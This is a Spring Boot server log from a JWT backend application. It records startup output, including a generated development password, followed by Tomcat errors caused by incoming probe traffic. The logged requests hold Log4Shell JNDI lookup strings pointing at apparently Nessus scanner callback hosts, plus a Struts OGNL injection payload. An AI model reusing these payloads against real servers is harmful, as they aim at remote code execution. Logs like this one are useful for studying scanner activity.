
  .   ____          _            __ _ _
 /\\ / ___'_ __ _ _(_)_ __  __ _ \ \ \ \
( ( )\___ | '_ | '_| | '_ \/ _` | \ \ \ \
 \\/  ___)| |_)| | | | | || (_| |  ) ) ) )
  '  |____| .__|_| |_|_| |_\__, | / / / /
 =========|_|==============|___/=/_/_/_/
 :: Spring Boot ::                (v3.1.3)

2023-12-05T07:53:17.333Z  INFO 7726 --- [           main] c.a.jwt.backend.BackendApplication       : Starting BackendApplication v0.0.1-SNAPSHOT using Java 17.0.9 with PID 7726 (/home/ubuntu/DStudy_backend/target/backend-0.0.1-SNAPSHOT.jar started by ubuntu in /home/ubuntu/DStudy_backend)
2023-12-05T07:53:17.344Z  INFO 7726 --- [           main] c.a.jwt.backend.BackendApplication       : No active profile set, falling back to 1 default profile: "default"
2023-12-05T07:53:19.185Z  INFO 7726 --- [           main] .s.d.r.c.RepositoryConfigurationDelegate : Bootstrapping Spring Data JPA repositories in DEFAULT mode.
2023-12-05T07:53:19.324Z  INFO 7726 --- [           main] .s.d.r.c.RepositoryConfigurationDelegate : Finished Spring Data repository scanning in 126 ms. Found 1 JPA repository interfaces.
2023-12-05T07:53:20.855Z  INFO 7726 --- [           main] o.s.b.w.embedded.tomcat.TomcatWebServer  : Tomcat initialized with port(s): 8080 (http)
2023-12-05T07:53:20.879Z  INFO 7726 --- [           main] o.apache.catalina.core.StandardService   : Starting service [Tomcat]
2023-12-05T07:53:20.879Z  INFO 7726 --- [           main] o.apache.catalina.core.StandardEngine    : Starting Servlet engine: [Apache Tomcat/10.1.12]
2023-12-05T07:53:21.162Z  INFO 7726 --- [           main] o.a.c.c.C.[Tomcat].[localhost].[/]       : Initializing Spring embedded WebApplicationContext
2023-12-05T07:53:21.164Z  INFO 7726 --- [           main] w.s.c.ServletWebServerApplicationContext : Root WebApplicationContext: initialization completed in 3693 ms
2023-12-05T07:53:21.545Z  INFO 7726 --- [           main] com.zaxxer.hikari.HikariDataSource       : HikariPool-1 - Starting...
2023-12-05T07:53:22.010Z  INFO 7726 --- [           main] com.zaxxer.hikari.pool.HikariPool        : HikariPool-1 - Added connection conn0: url=jdbc:h2:mem:e167d98d-c355-4790-8c45-7c126e774057 user=SA
2023-12-05T07:53:22.012Z  INFO 7726 --- [           main] com.zaxxer.hikari.HikariDataSource       : HikariPool-1 - Start completed.
2023-12-05T07:53:22.117Z  INFO 7726 --- [           main] o.hibernate.jpa.internal.util.LogHelper  : HHH000204: Processing PersistenceUnitInfo [name: default]
2023-12-05T07:53:22.243Z  INFO 7726 --- [           main] org.hibernate.Version                    : HHH000412: Hibernate ORM core version 6.2.7.Final
2023-12-05T07:53:22.245Z  INFO 7726 --- [           main] org.hibernate.cfg.Environment            : HHH000406: Using bytecode reflection optimizer
2023-12-05T07:53:22.549Z  INFO 7726 --- [           main] o.h.b.i.BytecodeProviderInitiator        : HHH000021: Bytecode provider name : bytebuddy
2023-12-05T07:53:22.837Z  INFO 7726 --- [           main] o.s.o.j.p.SpringPersistenceUnitInfo      : No LoadTimeWeaver setup: ignoring JPA class transformer
2023-12-05T07:53:23.598Z  INFO 7726 --- [           main] o.h.b.i.BytecodeProviderInitiator        : HHH000021: Bytecode provider name : bytebuddy
2023-12-05T07:53:24.618Z  INFO 7726 --- [           main] o.h.e.t.j.p.i.JtaPlatformInitiator       : HHH000490: Using JtaPlatform implementation: [org.hibernate.engine.transaction.jta.platform.internal.NoJtaPlatform]
2023-12-05T07:53:24.702Z  INFO 7726 --- [           main] j.LocalContainerEntityManagerFactoryBean : Initialized JPA EntityManagerFactory for persistence unit 'default'
2023-12-05T07:53:25.599Z  WARN 7726 --- [           main] JpaBaseConfiguration$JpaWebConfiguration : spring.jpa.open-in-view is enabled by default. Therefore, database queries may be performed during view rendering. Explicitly configure spring.jpa.open-in-view to disable this warning
2023-12-05T07:53:25.658Z  WARN 7726 --- [           main] .s.s.UserDetailsServiceAutoConfiguration : 

Using generated security password: 8fd1837d-7e02-4e18-b026-8b96988da54d

This generated password is for development use only. Your security configuration must be updated before running your application in production.

2023-12-05T07:53:26.266Z  INFO 7726 --- [           main] o.s.s.web.DefaultSecurityFilterChain     : Will secure any request with [org.springframework.security.web.session.DisableEncodeUrlFilter@1a6dc589, org.springframework.security.web.context.request.async.WebAsyncManagerIntegrationFilter@697a34af, org.springframework.security.web.context.SecurityContextHolderFilter@608fe01f, org.springframework.security.web.header.HeaderWriterFilter@26c89563, org.springframework.security.web.authentication.logout.LogoutFilter@7d78f3d5, com.aniketh.jwt.backend.config.JwtAuthFilter@70211df5, org.springframework.security.web.savedrequest.RequestCacheAwareFilter@5a75ec37, org.springframework.security.web.servletapi.SecurityContextHolderAwareRequestFilter@33956d1a, org.springframework.security.web.authentication.AnonymousAuthenticationFilter@4c5228e7, org.springframework.security.web.session.SessionManagementFilter@354e7004, org.springframework.security.web.access.ExceptionTranslationFilter@20d87335, org.springframework.security.web.access.intercept.AuthorizationFilter@48976e6d]
2023-12-05T07:53:26.914Z  INFO 7726 --- [           main] o.s.b.w.embedded.tomcat.TomcatWebServer  : Tomcat started on port(s): 8080 (http) with context path ''
2023-12-05T07:53:26.953Z  INFO 7726 --- [           main] c.a.jwt.backend.BackendApplication       : Started BackendApplication in 10.642 seconds (process running for 11.93)
2023-12-05T07:54:32.950Z  INFO 7726 --- [nio-8080-exec-1] o.apache.coyote.http11.Http11Processor   : Error parsing HTTP request header
 Note: further occurrences of HTTP request parsing errors will be logged at DEBUG level.

java.lang.IllegalArgumentException: Invalid character found in method name [0x160x030x010x00{0x010x000x00w0x030x030xad20xe4OK0xd20x18q0xf30x0000xa5^0xf2$?Ug0x94z^-0x130xea0xff0xbd0x9f0xc00xf8`0xe90x130x000x000x1a0xc0/0xc0+0xc00x110xc00x070xc00x130xc00x090xc00x140xc00x0a0x000x050x00/0x0050xc00x120x000x0a0x010x000x0040x000x050x000x050x010x000x000x000x000x000x0a0x000x080x000x060x000x170x000x180x000x190x000x0b0x000x020x010x000x000x0d0x000x100x000x0e0x040x010x040x030x020x010x020x030x040x010x050x010x060x010xff0x010x000x010x00...]. HTTP method names must be tokens
	at org.apache.coyote.http11.Http11InputBuffer.parseRequestLine(Http11InputBuffer.java:407) ~[tomcat-embed-core-10.1.12.jar!/:na]
	at org.apache.coyote.http11.Http11Processor.service(Http11Processor.java:264) ~[tomcat-embed-core-10.1.12.jar!/:na]
	at org.apache.coyote.AbstractProcessorLight.process(AbstractProcessorLight.java:63) ~[tomcat-embed-core-10.1.12.jar!/:na]
	at org.apache.coyote.AbstractProtocol$ConnectionHandler.process(AbstractProtocol.java:894) ~[tomcat-embed-core-10.1.12.jar!/:na]
	at org.apache.tomcat.util.net.NioEndpoint$SocketProcessor.doRun(NioEndpoint.java:1740) ~[tomcat-embed-core-10.1.12.jar!/:na]
	at org.apache.tomcat.util.net.SocketProcessorBase.run(SocketProcessorBase.java:52) ~[tomcat-embed-core-10.1.12.jar!/:na]
	at org.apache.tomcat.util.threads.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1191) ~[tomcat-embed-core-10.1.12.jar!/:na]
	at org.apache.tomcat.util.threads.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:659) ~[tomcat-embed-core-10.1.12.jar!/:na]
	at org.apache.tomcat.util.threads.TaskThread$WrappingRunnable.run(TaskThread.java:61) ~[tomcat-embed-core-10.1.12.jar!/:na]
	at java.base/java.lang.Thread.run(Thread.java:840) ~[na:na]

2023-12-05T08:29:46.876Z  INFO 7726 --- [nio-8080-exec-3] o.a.c.c.C.[Tomcat].[localhost].[/]       : Initializing Spring DispatcherServlet 'dispatcherServlet'
2023-12-05T08:29:46.876Z  INFO 7726 --- [nio-8080-exec-3] o.s.web.servlet.DispatcherServlet        : Initializing Servlet 'dispatcherServlet'
2023-12-05T08:29:46.877Z  INFO 7726 --- [nio-8080-exec-3] o.s.web.servlet.DispatcherServlet        : Completed initialization in 1 ms
2023-12-05T11:09:33.083Z  INFO 7726 --- [nio-8080-exec-5] o.apache.coyote.http11.Http11Processor   : Error parsing HTTP request header
 Note: further occurrences of HTTP request parsing errors will be logged at DEBUG level.

java.lang.IllegalArgumentException: Invalid character found in method name [0x160x030x010x020x000x010x000x010xfc0x030x030xac0x860xeb0xf7X{0x97(J0x190x140xb9m0x1f0xbeM0xfc0xde.0xc70xee0x870xef0xc50xf90xef0xbb0xc40xda0xc90xb50xe4 ]. HTTP method names must be tokens
	at org.apache.coyote.http11.Http11InputBuffer.parseRequestLine(Http11InputBuffer.java:407) ~[tomcat-embed-core-10.1.12.jar!/:na]
	at org.apache.coyote.http11.Http11Processor.service(Http11Processor.java:264) ~[tomcat-embed-core-10.1.12.jar!/:na]
	at org.apache.coyote.AbstractProcessorLight.process(AbstractProcessorLight.java:63) ~[tomcat-embed-core-10.1.12.jar!/:na]
	at org.apache.coyote.AbstractProtocol$ConnectionHandler.process(AbstractProtocol.java:894) ~[tomcat-embed-core-10.1.12.jar!/:na]
	at org.apache.tomcat.util.net.NioEndpoint$SocketProcessor.doRun(NioEndpoint.java:1740) ~[tomcat-embed-core-10.1.12.jar!/:na]
	at org.apache.tomcat.util.net.SocketProcessorBase.run(SocketProcessorBase.java:52) ~[tomcat-embed-core-10.1.12.jar!/:na]
	at org.apache.tomcat.util.threads.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1191) ~[tomcat-embed-core-10.1.12.jar!/:na]
	at org.apache.tomcat.util.threads.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:659) ~[tomcat-embed-core-10.1.12.jar!/:na]
	at org.apache.tomcat.util.threads.TaskThread$WrappingRunnable.run(TaskThread.java:61) ~[tomcat-embed-core-10.1.12.jar!/:na]
	at java.base/java.lang.Thread.run(Thread.java:840) ~[na:na]

2023-12-05T11:11:21.559Z  INFO 7726 --- [nio-8080-exec-4] o.apache.tomcat.util.http.parser.Cookie  : A cookie header was received [${jndi:ldap://log4shell-generic-iANXqYeXR0Xen4pOzXN8${lower:ten}.w.nessus.org/nessus}=${jndi:ldap://log4shell-generic-iANXqYeXR0Xen4pOzXN8${lower:ten}.w.nessus.org/nessus};] that contained an invalid cookie. That cookie will be ignored.
 Note: further occurrences of this error will be logged at DEBUG level.
2023-12-06T11:13:46.980Z  INFO 7726 --- [nio-8080-exec-2] o.apache.coyote.http11.Http11Processor   : Error parsing HTTP request header
 Note: further occurrences of HTTP request parsing errors will be logged at DEBUG level.

java.lang.IllegalArgumentException: Invalid character found in method name [0x160x030x010x000xdb0x010x000x000xd70x030x01|0x95}0xdad0x9a0xe90xe9@0x960x030x000xa60xec[&R0x19g0xda0xad0x800x130x970xb80xa080xfff50x0b0x050x000x00R0xc00x0a0xc00x140x0090x0080x000x880x000x870xc00x190x00:0x000x890xc00x090xc00x130x0030x0020x000x9a0x000x990x00E0x00D0xc00x180x0040x000x9b0x00F0xc00x070xc00x110xc00x160x000x180xc00x080xc00x120x000x160x000x130xc00x170x000x1b0x0050x000x840x00/0x000x960x00A0x000x070x000x050x000x040x000x0a0x000xff0x010x000x00\0x000x000x0040x0020x000x00/ec2-3-143-252-3.us-east-2.compute.amazonaws.com0x000x0b0x000x040x030x000x010x020x000x0a0x000x0c0x000x0a0x000x1d0x000x170x000x1e0x000x190x000x180x00#0x000x000x000x160x000x000x000x170x000x00...]. HTTP method names must be tokens
	at org.apache.coyote.http11.Http11InputBuffer.parseRequestLine(Http11InputBuffer.java:407) ~[tomcat-embed-core-10.1.12.jar!/:na]
	at org.apache.coyote.http11.Http11Processor.service(Http11Processor.java:264) ~[tomcat-embed-core-10.1.12.jar!/:na]
	at org.apache.coyote.AbstractProcessorLight.process(AbstractProcessorLight.java:63) ~[tomcat-embed-core-10.1.12.jar!/:na]
	at org.apache.coyote.AbstractProtocol$ConnectionHandler.process(AbstractProtocol.java:894) ~[tomcat-embed-core-10.1.12.jar!/:na]
	at org.apache.tomcat.util.net.NioEndpoint$SocketProcessor.doRun(NioEndpoint.java:1740) ~[tomcat-embed-core-10.1.12.jar!/:na]
	at org.apache.tomcat.util.net.SocketProcessorBase.run(SocketProcessorBase.java:52) ~[tomcat-embed-core-10.1.12.jar!/:na]
	at org.apache.tomcat.util.threads.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1191) ~[tomcat-embed-core-10.1.12.jar!/:na]
	at org.apache.tomcat.util.threads.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:659) ~[tomcat-embed-core-10.1.12.jar!/:na]
	at org.apache.tomcat.util.threads.TaskThread$WrappingRunnable.run(TaskThread.java:61) ~[tomcat-embed-core-10.1.12.jar!/:na]
	at java.base/java.lang.Thread.run(Thread.java:840) ~[na:na]

2023-12-06T11:16:59.438Z  INFO 7726 --- [nio-8080-exec-7] o.apache.tomcat.util.http.parser.Cookie  : A cookie header was received [${jndi:ldap://log4shell-generic-wfIzfyj82wgkFnwUinSi${lower:ten}.w.nessus.org/nessus}=${jndi:ldap://log4shell-generic-wfIzfyj82wgkFnwUinSi${lower:ten}.w.nessus.org/nessus};] that contained an invalid cookie. That cookie will be ignored.
 Note: further occurrences of this error will be logged at DEBUG level.
2023-12-07T11:15:42.907Z  INFO 7726 --- [nio-8080-exec-3] o.apache.coyote.http11.Http11Processor   : Error parsing HTTP request header
 Note: further occurrences of HTTP request parsing errors will be logged at DEBUG level.

java.lang.IllegalArgumentException: Invalid character found in the request target [/?tag=tenable-1441104073&method%3a%23_memberAccess%3d%40ognl.OgnlContext%40DEFAULT_MEMBER_ACCESS,%23writer%3d%40org.apache.struts2.ServletActionContext%40getResponse().getWriter(),%23writer.println(%23parameters.tag[0]),%23writer.flush(),%23writer.close ]. The valid characters are defined in RFC 7230 and RFC 3986
	at org.apache.coyote.http11.Http11InputBuffer.parseRequestLine(Http11InputBuffer.java:482) ~[tomcat-embed-core-10.1.12.jar!/:na]
	at org.apache.coyote.http11.Http11Processor.service(Http11Processor.java:264) ~[tomcat-embed-core-10.1.12.jar!/:na]
	at org.apache.coyote.AbstractProcessorLight.process(AbstractProcessorLight.java:63) ~[tomcat-embed-core-10.1.12.jar!/:na]
	at org.apache.coyote.AbstractProtocol$ConnectionHandler.process(AbstractProtocol.java:894) ~[tomcat-embed-core-10.1.12.jar!/:na]
	at org.apache.tomcat.util.net.NioEndpoint$SocketProcessor.doRun(NioEndpoint.java:1740) ~[tomcat-embed-core-10.1.12.jar!/:na]
	at org.apache.tomcat.util.net.SocketProcessorBase.run(SocketProcessorBase.java:52) ~[tomcat-embed-core-10.1.12.jar!/:na]
	at org.apache.tomcat.util.threads.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1191) ~[tomcat-embed-core-10.1.12.jar!/:na]
	at org.apache.tomcat.util.threads.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:659) ~[tomcat-embed-core-10.1.12.jar!/:na]
	at org.apache.tomcat.util.threads.TaskThread$WrappingRunnable.run(TaskThread.java:61) ~[tomcat-embed-core-10.1.12.jar!/:na]
	at java.base/java.lang.Thread.run(Thread.java:840) ~[na:na]

2023-12-07T11:17:02.454Z  INFO 7726 --- [nio-8080-exec-5] o.apache.tomcat.util.http.parser.Cookie  : A cookie header was received [${jndi:ldap://log4shell-generic-nlMXySljaYKCF8x2xQ0Z${lower:ten}.w.nessus.org/nessus}=${jndi:ldap://log4shell-generic-nlMXySljaYKCF8x2xQ0Z${lower:ten}.w.nessus.org/nessus};] that contained an invalid cookie. That cookie will be ignored.
 Note: further occurrences of this error will be logged at DEBUG level.
